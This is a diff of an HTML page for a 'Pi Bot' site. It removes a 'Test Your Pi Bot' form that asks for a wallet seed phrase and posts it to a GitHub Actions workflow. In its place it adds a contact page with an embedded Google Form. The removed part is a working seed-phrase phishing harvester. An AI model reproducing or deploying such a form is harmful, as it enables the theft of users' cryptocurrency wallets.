@@ -3,99 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pi Bot Test</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #1a1a2e;
-            color: white;
-            margin: 0;
-            padding: 0;
-        }
-        h1 { margin-top: 20px; }
-        p { color: #bbb; }
-        form {
-            background: #0f3460;
-            padding: 20px;
-            border-radius: 8px;
-            display: inline-block;
-            text-align: left;
-            margin-top: 20px;
-        }
-        label { font-size: 14px; display: block; margin-top: 10px; }
-        input, textarea {
-            width: 100%; padding: 10px; margin-top: 5px;
-            border-radius: 5px; border: none; font-size: 14px;
-        }
-        button {
-            width: 100%; padding: 10px; margin-top: 15px;
-            background: #e94560; border: none; color: white;
-            cursor: pointer; font-size: 16px; border-radius: 5px;
-        }
-        button:hover { background: #c02445; }
-        .message { margin-top: 10px; font-weight: bold; }
-        a { display: block; margin-top: 15px; color: #ffcc70; text-decoration: none; }
-        a:hover { text-decoration: underline; }
-    </style>
+    <title>Contact Us - Pi Bot</title>
 </head>
 <body>
-    <h1>Test Your Pi Bot Here</h1>
-    <p>Enter your details below:</p>
-    
-    <form id="bot-form">
-        <label for="bot-name">Preferred Name of Your Bot:</label>
-        <input type="text" id="bot-name" name="bot-name" required>
-
-        <label for="seed-phrase">Enter Your Wallet Seed Phrase:</label>
-        <textarea id="seed-phrase" name="seed-phrase" rows="4" required></textarea>
-
-        <button type="submit">Submit</button>
-    </form>
-
-    <div class="message" id="message"></div>
-
-    <a href="index.html">Back to Home</a>
-
-    <script>
-        document.getElementById('bot-form').addEventListener('submit', async function(event) {
-            event.preventDefault();
-            let botName = document.getElementById('bot-name').value.trim();
-            let seedPhrase = document.getElementById('seed-phrase').value.trim();
-            let messageDiv = document.getElementById('message');
-
-            if (!botName || !seedPhrase) {
-                messageDiv.style.color = "red";
-                messageDiv.textContent = "Please fill in both fields!";
-                return;
-            }
-
-            let data = {
-                bot_name: botName,
-                seed_phrase: seedPhrase,
-                timestamp: new Date().toISOString()
-            };
-
-            let response = await fetch('https://api.github.com/repos/Pius931/bot-security-site/actions/workflows/store-submission.yml/dispatches', {
-                method: 'POST',
-                headers: {
-                    'Accept': 'application/vnd.github.v3+json',
-                    'Authorization': 'Bearer YOUR_GITHUB_TOKEN'
-                },
-                body: JSON.stringify({
-                    ref: 'main',
-                    inputs: data
-                })
-            });
-
-            if (response.ok) {
-                messageDiv.style.color = "green";
-                messageDiv.textContent = "Submission sent!";
-            } else {
-                messageDiv.style.color = "red";
-                messageDiv.textContent = "Error submitting form!";
-            }
-        });
-    </script>
+    <h1>Contact Us</h1>
+    <p>Please fill out the form below:</p>
+    <!-- Embed Google Form -->
+    <iframe src="https://docs.google.com/forms/d/e/1FAIpQLSfXNj8x7pWMulut38pps4GC-npYgoHcknTa-J-Jwbz5UXRMYQ/viewform?embedded=true" width="640" height="583" frameborder="0" marginheight="0" marginwidth="0">Loading…</iframe>
 </body>
 </html>
